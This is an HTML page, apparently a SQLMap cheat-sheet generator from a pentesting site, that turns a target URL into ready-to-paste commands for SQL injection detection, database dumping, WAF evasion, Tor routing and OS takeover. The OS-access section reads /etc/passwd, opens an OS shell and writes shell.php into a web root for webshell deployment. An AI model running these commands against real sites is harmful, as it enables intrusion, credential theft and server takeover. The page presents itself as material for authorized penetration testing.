<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>awjunaid - SQLMap: Automatic SQL Injection Tool (Kali Linux)</title>
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
:root{
  --bg:#0a0e13;--s1:#161b22;--s2:#1c2128;
  --b1:#21262d;--b2:#30363d;
  --acc:#58a6ff;--grn:#3fb950;--red:#f85149;
  --ylw:#e3b341;--pur:#d2a8ff;--org:#ffa657;
  --txt:#e6edf3;--t2:#c9d1d9;--mut:#8b949e;--m2:#6e7681;
  --mono:'Fira Code','JetBrains Mono',monospace;
  --r:10px;--rs:6px;
}
html{scroll-behavior:smooth}
body{background:var(--bg);color:var(--t2);font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;min-height:100vh}
::-webkit-scrollbar{width:5px;height:5px}
::-webkit-scrollbar-track{background:var(--bg)}
::-webkit-scrollbar-thumb{background:var(--b2);border-radius:3px}
body::before{content:'';position:fixed;inset:0;pointer-events:none;z-index:-1;
  background-image:linear-gradient(rgba(88,166,255,.025) 1px,transparent 1px),linear-gradient(90deg,rgba(88,166,255,.025) 1px,transparent 1px);
  background-size:44px 44px}
header{position:sticky;top:0;z-index:9999;background:rgba(10,14,19,.97);backdrop-filter:blur(16px);
  border-bottom:1px solid var(--b1);padding:.75rem 1.5rem;
  display:flex;align-items:center;justify-content:space-between;gap:1rem;flex-wrap:wrap}
.hlogo{display:flex;align-items:center;gap:.65rem}
.hico{width:36px;height:36px;border-radius:8px;flex-shrink:0;
  background:linear-gradient(135deg,#58a6ff1a,#3fb9501a);border:1px solid #58a6ff33;
  display:flex;align-items:center;justify-content:center;font-size:1.1rem}
.hname{font-size:1.1rem;font-weight:800;background:linear-gradient(135deg,#58a6ff,#3fb950);
  -webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
.hsub{font-size:.65rem;color:var(--mut);margin-top:1px}
.hbadges{display:flex;gap:.35rem;flex-wrap:wrap}
.hb{font-size:.65rem;padding:.16rem .5rem;border-radius:2rem;border:1px solid var(--b2);color:var(--mut);background:var(--s1)}
.hb.g{color:var(--grn);border-color:#3fb95030;background:#3fb95010}
.hb.b{color:var(--acc);border-color:#58a6ff30;background:#58a6ff10}
.hb.y{color:var(--ylw);border-color:#e3b34130;background:#e3b34110}
.hb.r{color:var(--red);border-color:#f8514930;background:#f851490d}
.hb.p{color:var(--pur);border-color:#d2a8ff30;background:#d2a8ff0d}
.hb.o{color:var(--org);border-color:#ffa65730;background:#ffa6570d}
.hero{position:relative;z-index:10;max-width:860px;margin:2.5rem auto 2rem;padding:0 1.2rem;text-align:center}
.chip{display:inline-flex;align-items:center;gap:.4rem;font-size:.68rem;letter-spacing:1.4px;text-transform:uppercase;
  color:var(--acc);background:#58a6ff0e;border:1px solid #58a6ff2a;padding:.26rem .85rem;border-radius:2rem;margin-bottom:.9rem}
.hero h2{font-size:2rem;font-weight:800;color:var(--txt);line-height:1.2}
.grad{background:linear-gradient(135deg,#58a6ff,#3fb950,#d2a8ff);
  -webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
.hero p{color:var(--mut);margin-top:.55rem;font-size:.88rem;max-width:640px;margin-inline:auto;line-height:1.6}
.panel{margin-top:1.6rem;background:var(--s1);border:1px solid var(--b2);border-radius:14px;
  padding:1.2rem 1.3rem;box-shadow:0 8px 40px rgba(0,0,0,.45)}
.irow{display:flex;gap:.45rem;flex-wrap:wrap}
.ipfx{display:flex;align-items:center;padding:.68rem .85rem;background:var(--s2);
  border:1px solid var(--b2);border-radius:var(--rs);color:var(--mut);font-family:var(--mono);font-size:.8rem;white-space:nowrap}
#targetInput{flex:1;min-width:160px;padding:.7rem .95rem;border:1px solid var(--b2);border-radius:var(--rs);
  background:#0d1117;color:var(--txt);font-size:.93rem;outline:none;font-family:var(--mono);
  transition:border-color .18s,box-shadow .18s}
#targetInput:focus{border-color:var(--acc);box-shadow:0 0 0 3px #58a6ff1a}
#targetInput::placeholder{color:var(--m2)}
#generateBtn{padding:.7rem 1.5rem;border:none;border-radius:var(--rs);
  background:linear-gradient(135deg,#58a6ff,#1f6feb);color:#fff;font-size:.88rem;font-weight:700;
  cursor:pointer;white-space:nowrap;transition:opacity .18s,transform .1s}
#generateBtn:hover{opacity:.85}
#generateBtn:active{transform:scale(.97)}
.errbox{display:none;margin-top:.55rem;background:#f8514910;border:1px solid #f8514930;
  border-radius:var(--rs);padding:.42rem .65rem;font-size:.78rem;color:var(--red)}
.statsbar{display:none;gap:1rem;margin-top:.75rem;flex-wrap:wrap}
.sc{display:flex;align-items:center;gap:.3rem;font-size:.73rem;color:var(--mut)}
.sc strong{color:var(--txt)}
.sdot{width:6px;height:6px;border-radius:50%}
#toolbar{display:none;position:relative;z-index:500;max-width:1360px;margin:.7rem auto .3rem;
  padding:0 1.2rem;gap:.4rem;flex-wrap:wrap;align-items:center}
.vbtn{padding:.3rem .75rem;font-size:.73rem;border:1px solid var(--b1);border-radius:var(--rs);
  background:var(--s1);color:var(--mut);cursor:pointer;display:flex;align-items:center;gap:.3rem;transition:all .14s}
.vbtn.on{background:var(--s2);border-color:var(--b2);color:var(--txt)}
.vbtn:hover{border-color:var(--b2);color:var(--t2)}
.srch{position:relative;margin-left:auto}
#searchInput{display:block;width:260px;padding:.4rem .9rem .4rem 2.1rem;background:var(--s2);
  border:1px solid var(--b2);border-radius:var(--rs);color:var(--txt);font-size:.8rem;
  font-family:inherit;outline:none;transition:border-color .18s,box-shadow .18s}
#searchInput:focus{border-color:var(--acc);box-shadow:0 0 0 3px #58a6ff1a}
#searchInput::placeholder{color:var(--m2)}
.sico{position:absolute;left:.65rem;top:50%;transform:translateY(-50%);color:var(--mut);font-size:.8rem;pointer-events:none}
#pills{display:none;max-width:1360px;margin:0 auto .55rem;padding:0 1.2rem;gap:.35rem;flex-wrap:wrap}
.pill{padding:.26rem .72rem;border-radius:2rem;border:1px solid var(--b1);background:var(--s1);
  color:var(--mut);font-size:.72rem;cursor:pointer;transition:all .14s;user-select:none}
.pill:hover{border-color:var(--b2);color:var(--t2)}
.pill.on{background:var(--acc);color:#0d1117;border-color:var(--acc);font-weight:700}
#mainLayout{display:none;max-width:1360px;margin:0 auto 4rem;padding:0 1.2rem;gap:1.1rem;grid-template-columns:215px 1fr}
@media(max-width:820px){#mainLayout{grid-template-columns:1fr}}
#sidebar{position:sticky;top:72px;height:fit-content;display:flex;flex-direction:column;gap:.2rem}
@media(max-width:820px){#sidebar{display:none}}
.sbt{font-size:.61rem;letter-spacing:1.2px;text-transform:uppercase;color:var(--m2);padding:.3rem .48rem;margin-top:.3rem}
.sbtn{display:flex;align-items:center;gap:.45rem;padding:.38rem .55rem;border-radius:var(--rs);
  border:none;background:none;color:var(--mut);font-size:.77rem;cursor:pointer;width:100%;text-align:left;
  transition:all .14s;border-left:2px solid transparent}
.sbtn:hover{background:var(--s1);color:var(--t2)}
.sbtn.on{background:var(--s2);color:var(--acc);border-left-color:var(--acc)}
.sbico{font-size:.92rem;width:17px;text-align:center;flex-shrink:0}
.sblbl{flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.sbcnt{font-size:.61rem;padding:.06rem .35rem;border-radius:2rem;background:var(--s1);
  border:1px solid var(--b1);color:var(--m2);flex-shrink:0}
.sbtn.on .sbcnt{background:#58a6ff1a;border-color:#58a6ff33;color:var(--acc)}
.sbsep{height:1px;background:var(--b1);margin:.28rem 0}
#content{position:relative;z-index:1}
.sec{margin-bottom:1.8rem}
.sechdr{display:flex;align-items:center;gap:.6rem;margin-bottom:.75rem;padding-bottom:.65rem;border-bottom:1px solid var(--b1)}
.secico{font-size:1.3rem;flex-shrink:0}
.sectitle{font-size:.92rem;font-weight:700;color:var(--txt)}
.secsub{font-size:.72rem;color:var(--mut);margin-top:1px;line-height:1.5}
.seccnt{margin-left:auto;font-size:.65rem;padding:.15rem .48rem;border-radius:2rem;
  background:var(--s2);border:1px solid var(--b2);color:var(--mut);white-space:nowrap;flex-shrink:0}
.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(430px,1fr));gap:.85rem}
@media(max-width:900px){.grid{grid-template-columns:1fr}}
.card{background:var(--s1);border:1px solid var(--b1);border-radius:var(--r);overflow:hidden;
  display:flex;flex-direction:column;transition:border-color .18s,box-shadow .18s}
.card:hover{border-color:var(--b2);box-shadow:0 4px 24px rgba(0,0,0,.35)}
.ch{padding:.85rem 1rem .65rem;border-bottom:1px solid var(--b1);background:linear-gradient(135deg,var(--s2),var(--s1))}
.ctrow{display:flex;align-items:flex-start;gap:.5rem;margin-bottom:.45rem}
.cico{font-size:1.15rem;flex-shrink:0;margin-top:1px}
.cname{font-weight:700;font-size:.9rem;color:var(--txt);flex:1;line-height:1.3}
.cbadges{display:flex;gap:.28rem;flex-wrap:wrap;flex-shrink:0}
.bdg{font-size:.59rem;padding:.1rem .44rem;border-radius:2rem;border:1px solid}
.b-autoscan{color:#58a6ff;border-color:#58a6ff2a;background:#58a6ff0a}
.b-manverify{color:#3fb950;border-color:#3fb9502a;background:#3fb9500a}
.b-cveresearch{color:#f778ba;border-color:#f778ba2a;background:#f778ba0a}
.b-misconfig{color:#fbbf24;border-color:#fbbf242a;background:#fbbf240a}
.b-authn{color:#e879f9;border-color:#e879f92a;background:#e879f90a}
.b-bizlogic{color:#38bdf8;border-color:#38bdf82a;background:#38bdf80a}
.b-ratelimit{color:#fb923c;border-color:#fb923c2a;background:#fb923c0a}
.b-cvss{color:#a3e635;border-color:#a3e6352a;background:#a3e6350a}
.b-priority{color:#f472b6;border-color:#f472b62a;background:#f472b60a}
.rb{font-size:.59rem;padding:.1rem .44rem;border-radius:2rem;border:1px solid;font-weight:700}
.r-info{color:#58a6ff;border-color:#58a6ff33;background:#58a6ff0d}
.r-low{color:#3fb950;border-color:#3fb95033;background:#3fb9500d}
.r-medium{color:#e3b341;border-color:#e3b34133;background:#e3b3410d}
.r-high{color:#ffa657;border-color:#ffa65733;background:#ffa6570d}
.r-critical{color:#f85149;border-color:#f8514933;background:#f851490d}
.what{background:#58a6ff07;border:1px solid #58a6ff1a;border-radius:var(--rs);
  padding:.45rem .65rem;font-size:.73rem;color:var(--t2);line-height:1.58}
.wlbl{font-size:.6rem;letter-spacing:.8px;text-transform:uppercase;color:var(--acc);font-weight:700;margin-bottom:.18rem}
.cb{padding:.8rem 1rem;display:flex;flex-direction:column;gap:.6rem}
.dblk{background:#0d1117;border:1px solid var(--b1);border-radius:var(--rs);overflow:hidden}
.dbar{display:flex;align-items:center;justify-content:space-between;padding:.28rem .65rem;
  border-bottom:1px solid var(--b1);background:var(--s1)}
.dbar-l{display:flex;align-items:center;gap:.45rem}
.dots{display:flex;gap:3px}
.dots span{width:8px;height:8px;border-radius:50%}
.d1{background:#f85149}.d2{background:#e3b341}.d3{background:#3fb950}
.dbar-r{display:flex;align-items:center;gap:.35rem}
.cbtn{background:none;border:1px solid var(--b2);color:var(--mut);font-size:.65rem;
  padding:.13rem .5rem;border-radius:3px;cursor:pointer;transition:all .14s;font-family:var(--mono)}
.cbtn:hover{border-color:var(--acc);color:var(--acc)}
.cbtn.ok{border-color:var(--grn)!important;color:var(--grn)!important}
.dpre{padding:.65rem .9rem;font-family:var(--mono);font-size:.78rem;color:#a5f3a5;
  line-height:1.75;white-space:pre-wrap;word-break:break-all;margin:0}
.dpre .kw{color:#79c0ff;font-weight:700}
.dpre .fl{color:#ffa657;font-weight:600}
.dpre .tgt{color:#f85149;font-weight:700}
.ptog{display:flex;align-items:center;justify-content:space-between;background:var(--s2);
  border:1px solid var(--b1);border-radius:var(--rs);padding:.34rem .65rem;
  font-size:.7rem;color:var(--mut);cursor:pointer;transition:all .14s;width:100%;text-align:left}
.ptog:hover{border-color:var(--b2);color:var(--t2)}
.ptog .arr{transition:transform .18s;font-size:.58rem;margin-left:auto;padding-left:.5rem}
.ptog.open .arr{transform:rotate(180deg)}
.pwrap{display:none;border:1px solid var(--b1);border-top:none;border-radius:0 0 var(--rs) var(--rs);overflow:hidden}
.pwrap.open{display:block}
.ptbl{width:100%;border-collapse:collapse;font-size:.7rem}
.ptbl th{text-align:left;padding:.32rem .58rem;background:var(--bg);color:var(--m2);
  font-size:.61rem;letter-spacing:.5px;text-transform:uppercase;border-bottom:1px solid var(--b1)}
.ptbl td{padding:.32rem .58rem;border-bottom:1px solid var(--b1);vertical-align:top}
.ptbl tr:last-child td{border-bottom:none}
.ptbl tr:hover td{background:var(--s2)}
.pf{font-family:var(--mono);color:var(--grn);font-size:.68rem}
.pd{color:var(--mut);font-size:.68rem}
.tip{background:#e3b34110;border:1px solid #e3b34128;border-radius:var(--rs);
  padding:.44rem .65rem;font-size:.71rem;color:#e3b341;display:flex;gap:.42rem;line-height:1.5;align-items:flex-start}
.wrn{background:#f8514910;border:1px solid #f8514928;border-radius:var(--rs);
  padding:.44rem .65rem;font-size:.71rem;color:#f85149;display:flex;gap:.42rem;line-height:1.5;align-items:flex-start}
.ctable{background:var(--s1);border:1px solid var(--b1);border-radius:var(--r);overflow:hidden}
.chdr{display:grid;grid-template-columns:200px 1fr 82px 80px;gap:.4rem;padding:.36rem .75rem;
  background:var(--s2);border-bottom:1px solid var(--b1);font-size:.62rem;color:var(--m2);
  letter-spacing:.5px;text-transform:uppercase}
.crow{display:grid;grid-template-columns:200px 1fr 82px 80px;gap:.4rem;padding:.44rem .75rem;
  border-bottom:1px solid var(--b1);align-items:center;transition:background .14s}
.crow:last-child{border-bottom:none}
.crow:hover{background:var(--s2)}
.cr-name{font-size:.75rem;font-weight:600;color:var(--txt);overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.cr-cmd{font-family:var(--mono);font-size:.68rem;color:#a5f3a5;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.cr-act{display:flex;gap:.28rem;align-items:center}
.crc{background:none;border:1px solid var(--b2);color:var(--mut);font-size:.62rem;
  padding:.1rem .38rem;border-radius:3px;cursor:pointer;transition:all .14s}
.crc:hover{border-color:var(--acc);color:var(--acc)}
.crc.ok{border-color:var(--grn)!important;color:var(--grn)!important}
@media(max-width:640px){.chdr,.crow{grid-template-columns:130px 1fr 70px}}
.nores{text-align:center;padding:3.5rem;color:var(--mut)}
.nores h3{font-size:.95rem;color:var(--t2);margin-bottom:.4rem}
footer{position:relative;z-index:1;border-top:1px solid var(--b1);padding:1.4rem 1.5rem;text-align:center;font-size:.74rem;color:var(--mut)}
.legal{display:inline-block;background:#f8514910;border:1px solid #f8514928;border-radius:var(--rs);
  padding:.5rem 1.1rem;max-width:700px;color:#f85149;margin-bottom:.8rem;font-size:.72rem;line-height:1.55}
footer a{color:var(--acc);text-decoration:none}
footer a:hover{text-decoration:underline}
.fbrand{font-weight:800;font-size:.8rem;background:linear-gradient(135deg,#58a6ff,#3fb950);
  -webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
</style>
</head>
<body>

<header>
  <div class="hlogo">
    <div class="hico">&#128273;</div>
    <div>
      <div class="hname">awjunaid</div>
      <div class="hsub">SQLMap: Automatic SQL Injection Tool (Kali Linux)</div>
    </div>
  </div>
  <div class="hbadges">
    <span class="hb g">&#10003; 6+ DBMS Support</span>
    <span class="hb b">&#128273; SQL Injection</span>
    <span class="hb y">&#128220; Database Takeover</span>
    <span class="hb p">&#128274; WAF Bypass</span>
    <span class="hb o">&#128736; Data Extraction</span>
    <span class="hb r">&#9888; Authorized Only</span>
  </div>
</header>

<section class="hero">
  <div class="chip">&#128273; SQLMap SQL Injection Automation (Kali Linux)</div>
  <h2>Enter Target URL → Get <span class="grad">SQLMap Commands</span></h2>
  <p>Type any vulnerable URL parameter and instantly get copy-paste ready SQLMap commands for detection, exploitation, database enumeration, and data extraction.</p>
  <div class="panel">
    <div class="irow">
      <div class="ipfx">&#127919; target:</div>
      <input id="targetInput" type="text" placeholder="http://example.com/page.php?id=1" autocomplete="off" spellcheck="false"/>
      <button id="generateBtn">Generate &#128273;</button>
    </div>
    <div class="errbox" id="errbox">&#9888; Please enter a valid URL e.g. <strong>http://example.com/page.php?id=1</strong></div>
    <div class="statsbar" id="statsbar">
      <div class="sc"><div class="sdot" style="background:var(--acc)"></div>Categories: <strong id="sc1">0</strong></div>
      <div class="sc"><div class="sdot" style="background:var(--grn)"></div>Commands: <strong id="sc2">0</strong></div>
      <div class="sc"><div class="sdot" style="background:var(--ylw)"></div>Target: <strong id="sc3">-</strong></div>
    </div>
  </div>
</section>

<div id="toolbar">
  <button class="vbtn on" id="vcard">&#9635; Cards</button>
  <button class="vbtn" id="vcomp">&#9776; Compact</button>
  <div class="srch">
    <span class="sico">&#128269;</span>
    <input type="text" id="searchInput" placeholder="Search techniques, options, DBMS..." autocomplete="off" spellcheck="false"/>
  </div>
</div>

<div id="pills"></div>

<div id="mainLayout">
  <aside id="sidebar"></aside>
  <main id="content"></main>
</div>

<footer>
  <div class="legal">
    &#9888; <strong>Legal Disclaimer:</strong> These SQLMap commands are for <strong>authorized security testing only</strong>.
    Only use on web applications you own or have explicit written permission to test.
    Unauthorized SQL injection may violate computer fraud and abuse laws.
  </div>
  <br/>
  <span>Built for ethical hackers, penetration testers, and security professionals &bull; </span>
  <a href="https://awjunaid.com" target="_blank" rel="noopener">awjunaid.com</a>
  <br/><br/>
  <span class="fbrand">awjunaid</span>
  <span> &mdash; Copyright © 2025 </span>
  <a href="https://awjunaid.com" target="_blank" rel="noopener">awjunaid.com</a>
  <span>. All rights reserved.</span>
</footer>

<script>
/* ── DATA (SQLMap only) ── */
var CATS = [
{id:"detection",icon:"&#128269;",badge:"b-autoscan",
 title:"Detection & Fingerprinting",
 desc:"Basic SQLMap commands to detect SQL injection vulnerabilities and fingerprint the database management system.",
 tip:"Start with -u and --batch for non-interactive detection. Add --level and --risk for deeper testing.",
 warn:"Detection scans can be noisy – use with caution on production systems.",
 flags:[
   {f:"-u <url>",d:"Target URL (with parameter)"},
   {f:"--batch",d:"Never ask for user input, use defaults"},
   {f:"--level <1-5>",d:"Level of tests (1-5, default 1)"},
   {f:"--risk <1-3>",d:"Risk of tests (1-3, default 1)"}
 ],
 cmds:[
   {l:"Basic detection",r:"medium",c:"sqlmap -u \"http://{T}\" --batch",e:"Tests the URL parameter for SQL injection vulnerabilities. Runs in batch mode with default settings."},
   {l:"Increased level/risk",r:"high",c:"sqlmap -u \"http://{T}\" --level=3 --risk=2",e:"Increases test depth and risk. More thorough but may cause more requests."},
   {l:"Fingerprint DBMS",r:"low",c:"sqlmap -u \"http://{T}\" --fingerprint",e:"Attempts to fingerprint the database management system (MySQL, Oracle, MSSQL, etc.)."},
   {l:"Specific parameter",r:"medium",c:"sqlmap -u \"http://example.com/page.php?id=1\" -p id",e:"Tests only the 'id' parameter. Useful when multiple parameters exist."}
 ]
},
{id:"enumeration",icon:"&#128220;",badge:"b-manverify",
 title:"Database Enumeration",
 desc:"Extract database names, tables, columns, and data once injection is confirmed.",
 tip:"Start with --dbs to list databases, then --tables -D dbname, then --columns, then --dump.",
 warn:"Data extraction can take time and create large network traffic.",
 flags:[
   {f:"--dbs",d:"Enumerate databases"},
   {f:"--tables",d:"Enumerate tables"},
   {f:"--columns",d:"Enumerate columns"},
   {f:"--dump",d:"Dump table data"},
   {f:"-D <db>",d:"Database name"},
   {f:"-T <table>",d:"Table name"},
   {f:"-C <col>",d:"Column name"}
 ],
 cmds:[
   {l:"List databases",r:"critical",c:"sqlmap -u \"http://{T}\" --dbs",e:"Enumerates all databases on the server. First step after confirming injection."},
   {l:"List tables in database",r:"critical",c:"sqlmap -u \"http://{T}\" -D database_name --tables",e:"Lists all tables in the specified database. Replace 'database_name' with actual name."},
   {l:"List columns in table",r:"critical",c:"sqlmap -u \"http://{T}\" -D database_name -T table_name --columns",e:"Shows all columns in the specified table with their data types."},
   {l:"Dump table data",r:"critical",c:"sqlmap -u \"http://{T}\" -D database_name -T users --dump",e:"Extracts all data from the 'users' table. May prompt for password cracking."},
   {l:"Dump specific columns",r:"high",c:"sqlmap -u \"http://{T}\" -D database_name -T users -C username,password --dump",e:"Dumps only specified columns (username, password) from the users table."},
   {l:"Dump all databases",r:"critical",c:"sqlmap -u \"http://{T}\" --dump-all",e:"Dumps all databases, tables, and data. Extremely noisy and time-consuming."}
 ]
},
{id:"auth",icon:"&#128274;",badge:"b-cveresearch",
 title:"Authentication & Session",
 desc:"Handle authenticated scanning with cookies, session tokens, and login forms.",
 tip:"Use --cookie from browser after logging in. For forms, use --data with POST parameters.",
 warn:"Credentials in command line may be visible in process lists. Use with caution.",
 flags:[
   {f:"--cookie <cookie>",d:"HTTP Cookie header"},
   {f:"--data <data>",d:"POST data string"},
   {f:"--auth-type <type>",d:"Auth type (basic, digest, ntlm)"},
   {f:"--auth-cred <user:pass>",d:"Auth credentials"}
 ],
 cmds:[
   {l:"Cookie-based session",r:"critical",c:"sqlmap -u \"http://{T}\" --cookie=\"PHPSESSID=abc123; security=low\"",e:"Uses session cookie for authenticated scanning. Copy from browser after login."},
   {l:"POST data injection",r:"critical",c:"sqlmap -u \"http://{T}/login.php\" --data=\"username=admin&password=admin\"",e:"Tests POST parameters for SQL injection. Common in login forms."},
   {l:"Basic authentication",r:"high",c:"sqlmap -u \"http://{T}\" --auth-type=basic --auth-cred=\"admin:password\"",e:"Provides Basic Auth credentials for protected areas."},
   {l:"NTLM authentication",r:"high",c:"sqlmap -u \"http://{T}\" --auth-type=ntlm --auth-cred=\"DOMAIN\\admin:password\"",e:"NTLM authentication for Windows-integrated authentication."},
   {l:"Cookie from file",r:"medium",c:"sqlmap -u \"http://{T}\" --cookie-file=cookies.txt",e:"Loads cookies from a file (Netscape format)."}
 ]
},
{id:"techniques",icon:"&#128295;",badge:"b-misconfig",
 title:"Injection Techniques",
 desc:"Control which SQL injection techniques SQLMap uses: Boolean-based, time-based, error-based, UNION, and stacked queries.",
 tip:"Use --technique to force specific techniques. Time-based is slow but reliable.",
 warn:"Some techniques (stacked queries) may modify database data. Use with extreme caution.",
 flags:[
   {f:"--technique <tech>",d:"Techniques: B(boolean), E(error), U(union), S(stacked), T(time)"}
 ],
 cmds:[
   {l:"Boolean-based only",r:"medium",c:"sqlmap -u \"http://{T}\" --technique=B",e:"Uses only boolean-based blind injection. Fast and reliable when it works."},
   {l:"Time-based only",r:"high",c:"sqlmap -u \"http://{T}\" --technique=T",e:"Uses only time-based blind injection. Slow but works when no other output exists."},
   {l:"Error-based only",r:"high",c:"sqlmap -u \"http://{T}\" --technique=E",e:"Uses error-based injection. Fast when database errors are displayed."},
   {l:"UNION query only",r:"high",c:"sqlmap -u \"http://{T}\" --technique=U",e:"Uses UNION query injection. Fast when number of columns is known."},
   {l:"All techniques",r:"critical",c:"sqlmap -u \"http://{T}\" --technique=BEUST",e:"Uses all available techniques. Most comprehensive but slowest."}
 ]
},
{id:"evasion",icon:"&#128584;",badge:"b-authn",
 title:"WAF Bypass & Evasion",
 desc:"Bypass Web Application Firewalls (WAF) and intrusion detection systems with various evasion techniques.",
 tip:"Start with --tamper=space2comment for simple bypass. Combine multiple tampers for stronger WAFs.",
 warn:"Tampering may increase false positives. Verify findings manually.",
 flags:[
   {f:"--tamper <tamper>",d:"Use tamper script(s)"},
   {f:"--random-agent",d:"Use random User-Agent"},
   {f:"--randomize <param>",d:"Randomize parameter value"}
 ],
 cmds:[
   {l:"Basic WAF bypass",r:"high",c:"sqlmap -u \"http://{T}\" --tamper=space2comment",e:"Replaces spaces with comments. Bypasses simple WAF rules."},
   {l:"Multiple tampers",r:"critical",c:"sqlmap -u \"http://{T}\" --tamper=space2comment,between,randomcase",e:"Applies multiple tamper scripts for stronger evasion."},
   {l:"MSSQL specific bypass",r:"high",c:"sqlmap -u \"http://{T}\" --tamper=between,char2ascii",e:"Tamper scripts optimized for MSSQL databases."},
   {l:"MySQL specific bypass",r:"high",c:"sqlmap -u \"http://{T}\" --tamper=versionedmorekeywords",e:"MySQL-specific evasion techniques."},
   {l:"Random User-Agent",r:"low",c:"sqlmap -u \"http://{T}\" --random-agent",e:"Uses random User-Agent headers to avoid fingerprinting."}
 ]
},
{id:"performance",icon:"&#128640;",badge:"b-ratelimit",
 title:"Performance Tuning",
 desc:"Optimize SQLMap's speed, threads, and delays for different network conditions.",
 tip:"Start with --threads=5 for balance. Increase if target can handle it.",
 warn:"Too many threads may overwhelm the server or trigger DoS protection.",
 flags:[
   {f:"--threads <num>",d:"Number of threads (1-10)"},
   {f:"--delay <sec>",d:"Delay between requests"},
   {f:"--timeout <sec>",d:"Request timeout"},
   {f:"--retries <num>",d:"Retries on connection failure"}
 ],
 cmds:[
   {l:"Fast multi-threaded",r:"critical",c:"sqlmap -u \"http://{T}\" --threads=10",e:"Uses 10 threads for maximum speed. Use with permission only."},
   {l:"Stealth with delay",r:"medium",c:"sqlmap -u \"http://{T}\" --delay=2",e:"Adds 2-second delay between requests. Slow but stealthy."},
   {l:"Slow connection tuning",r:"medium",c:"sqlmap -u \"http://{T}\" --timeout=30 --retries=3",e:"Longer timeout and more retries for unstable connections."},
   {l:"Safe rate limiting",r:"high",c:"sqlmap -u \"http://{T}\" --safe-url=http://{T}/safe --safe-freq=10",e:"Visits safe URL every 10 requests to maintain session."}
 ]
},
{id:"output",icon:"&#128451;",badge:"b-bizlogic",
 title:"Output & Logging",
 desc:"Control output verbosity, save sessions, and generate reports.",
 tip:"Use -v 3 for detailed output during debugging. Save session with -s to resume later.",
 warn:"Log files may contain sensitive data. Handle securely.",
 flags:[
   {f:"-v <level>",d:"Verbosity level (0-6)"},
   {f:"-s <file>",d:"Save session to file"},
   {f:"--output-dir <dir>",d:"Custom output directory"}
 ],
 cmds:[
   {l:"Quiet mode",r:"low",c:"sqlmap -u \"http://{T}\" -v 0",e:"Minimal output – only shows warnings and results."},
   {l:"Debug output",r:"low",c:"sqlmap -u \"http://{T}\" -v 5",e:"Shows all HTTP requests and responses. Useful for debugging."},
   {l:"Save session",r:"high",c:"sqlmap -u \"http://{T}\" -s session.sqlmap",e:"Saves session state to resume later. Essential for long scans."},
   {l:"Resume session",r:"high",c:"sqlmap -s session.sqlmap",e:"Resumes a previously saved scan session."}
 ]
},
{id:"os",icon:"&#128421;",badge:"b-priority",
 title:"OS Access & Command Execution",
 desc:"Advanced features for operating system access, command execution, and file system interaction.",
 tip:"Use --os-shell for interactive shell on the database server (if privileges allow).",
 warn:"OS access is extremely dangerous. Only use with explicit permission and on test systems.",
 flags:[
   {f:"--os-cmd <cmd>",d:"Execute OS command"},
   {f:"--os-shell",d:"Get interactive OS shell"},
   {f:"--file-read <file>",d:"Read file from server"},
   {f:"--file-write <file>",d:"Write file to server"}
 ],
 cmds:[
   {l:"Execute OS command",r:"critical",c:"sqlmap -u \"http://{T}\" --os-cmd=\"whoami\"",e:"Executes a single OS command on the database server. Requires high privileges."},
   {l:"Interactive OS shell",r:"critical",c:"sqlmap -u \"http://{T}\" --os-shell",e:"Attempts to get an interactive OS shell on the server."},
   {l:"Read file from server",r:"critical",c:"sqlmap -u \"http://{T}\" --file-read=\"/etc/passwd\"",e:"Reads a file from the database server's file system."},
   {l:"Write file to server",r:"critical",c:"sqlmap -u \"http://{T}\" --file-write=\"/tmp/shell.php\" --file-dest=\"/var/www/html/shell.php\"",e:"Uploads a local file to the server. Useful for webshell deployment."}
 ]
},
{id:"proxy",icon:"&#128736;",badge:"b-cvss",
 title:"Proxy & Networking",
 desc:"Route SQLMap through proxy (Burp, ZAP) or Tor for anonymity and debugging.",
 tip:"Use --proxy with Burp to inspect/modify requests in real-time.",
 warn:"Tor scanning will be very slow. Use only when anonymity is required.",
 flags:[
   {f:"--proxy <proxy>",d:"Use HTTP/S proxy"},
   {f:"--tor",d:"Use Tor anonymity network"},
   {f:"--tor-port <port>",d:"Tor SOCKS port"}
 ],
 cmds:[
   {l:"Route through Burp",r:"high",c:"sqlmap -u \"http://{T}\" --proxy=\"http://127.0.0.1:8080\"",e:"Sends traffic through Burp/ZAP proxy. Great for debugging and manual inspection."},
   {l:"Tor anonymity",r:"high",c:"sqlmap -u \"http://{T}\" --tor --tor-port=9050",e:"Routes traffic through Tor network. Hides your IP address."},
   {l:"Proxy with authentication",r:"medium",c:"sqlmap -u \"http://{T}\" --proxy=\"http://user:pass@proxy:8080\"",e:"Uses authenticated proxy."}
 ]
},
{id:"forms",icon:"&#128220;",badge:"b-autoscan",
 title:"Form Detection & Crawling",
 desc:"Automatically detect and test forms for SQL injection vulnerabilities.",
 tip:"Use --forms with --crawl to automatically find and test forms.",
 warn:"Crawling may discover many pages – can be time-consuming.",
 flags:[
   {f:"--forms",d:"Parse and test forms"},
   {f:"--crawl <depth>",d:"Crawl website from start URL"}
 ],
 cmds:[
   {l:"Test all forms on page",r:"high",c:"sqlmap -u \"http://{T}\" --forms",e:"Parses HTML forms on the page and tests all parameters for SQL injection."},
   {l:"Crawl and test forms",r:"critical",c:"sqlmap -u \"http://{T}\" --crawl=3 --forms",e:"Crawls up to depth 3, finds all forms, and tests them for SQL injection."},
   {l:"Crawl with authentication",r:"critical",c:"sqlmap -u \"http://{T}\" --crawl=3 --forms --cookie=\"session=abc123\"",e:"Crawls authenticated areas and tests all discovered forms."}
 ]
},
{id:"optimize",icon:"&#128640;",badge:"b-manverify",
 title:"Optimization Flags",
 desc:"Use built-in optimization flags to speed up scans.",
 tip:"Combine --optimize with --threads for maximum speed.",
 warn:"Optimization may reduce stealth. Use on test environments only.",
 flags:[
   {f:"-o",d:"Enable all optimization switches"},
   {f:"--predict-output",d:"Predict output for common queries"},
   {f:"--keep-alive",d:"Use persistent HTTP connections"}
 ],
 cmds:[
